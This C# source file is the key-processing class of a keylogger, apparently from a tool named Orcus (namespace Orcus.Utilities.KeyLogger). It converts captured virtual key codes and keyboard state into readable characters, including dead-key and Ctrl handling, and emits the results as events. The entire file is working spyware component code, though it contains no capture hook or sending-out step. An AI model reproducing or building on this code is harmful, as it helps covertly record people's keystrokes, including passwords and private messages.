using System;
using System.Collections;
using System.Text;
using System.Windows.Forms;
using Orcus.Native;

namespace Orcus.Utilities.KeyLogger
{
    internal class KeyProcessing
    {
        private readonly ArrayList _deadKeys = new ArrayList();
        private bool _deadKeyOver;

        private bool _lastWasDeadKey;

        public event EventHandler<StringDownEventArgs> StringDown;
        public event EventHandler<StringDownEventArgs> StringUp;

        private void OnKeyActionFurtherProcessing2(uint vkcode, uint nScanCode, bool isDown, byte[] kbstate)
        {
            var result = ((Keys) vkcode).ToString();

            // Another Fix beside the deadkeys workarround, needed because ToAscii doesnt work when STRG is pressed
            if (IsPrintableKey(vkcode) && !IsCtrlPressed())
            {
                var szKey = new StringBuilder(2);

                var nConvOld = (uint) NativeMethods.ToAscii(vkcode, nScanCode, kbstate, szKey, 0);
                _deadKeyOver = false;
                if (nConvOld > 0 && szKey.Length > 0)
                    result = szKey.ToString().Substring(0, 1);
            }

            if (isDown)
            {
                StringDown?.Invoke(result, new StringDownEventArgs(result.Length == 1, result, vkcode));
            }
            else
            {
                StringUp?.Invoke(result, new StringDownEventArgs(result.Length == 1, result, vkcode));
            }
        }

        internal void ProcessKeyAction(uint vkcode, uint nScanCode, bool isDown)
        {
            if (IsDeadKey(vkcode))
            {
                _lastWasDeadKey = true;
                var oldKbstate = MyGetKeyboardState();
                _deadKeys.Add(new object[] {vkcode, nScanCode, isDown, oldKbstate});
                return;
            }

            if (_lastWasDeadKey)
            {
                var oldKbstate = MyGetKeyboardState();
                _deadKeyOver = true;
                _lastWasDeadKey = false;
                _deadKeys.Add(new object[] {vkcode, nScanCode, isDown, oldKbstate});
                return;
            }

            if (_deadKeyOver)
            {
                foreach (var obj in _deadKeys)
                {
                    var objArray = (object[]) obj;

                    OnKeyActionFurtherProcessing2((uint) objArray[0], (uint) objArray[1], (bool) objArray[2],
                        (byte[]) objArray[3]);

                    if (IsDeadKey((uint) objArray[0]))
                        NativeMethods.ToAscii(vkcode, nScanCode, (byte[]) objArray[3], new StringBuilder(2), 0);
                }

                _deadKeys.Clear();
            }

            var kbstate = MyGetKeyboardState();

            OnKeyActionFurtherProcessing2(vkcode, nScanCode, isDown, kbstate);
        }

        private static byte[] MyGetKeyboardState()
        {
            var result = new byte[256];
            for (var i = 0; i < result.Length; i++)
            {
                result[i] = (byte) NativeMethods.GetKeyState(i);
            }

            return result;
        }

        private bool IsPrintableKey(uint vkCode)
        {
            return vkCode >= 0x20;
        }

        private static bool IsDeadKey(uint vkCode)
        {
            // Checks for Diacritic Characters
            return (NativeMethods.MapVirtualKey(vkCode, MapVirtualKeyMapTypes.MAPVK_VK_TO_CHAR) & 0x80000000) != 0;
        }

        // Is Needed for the ToAscii CTRL Bug
        private bool IsCtrlPressed()
        {
            return Control.ModifierKeys == Keys.Control;
        }
    }
}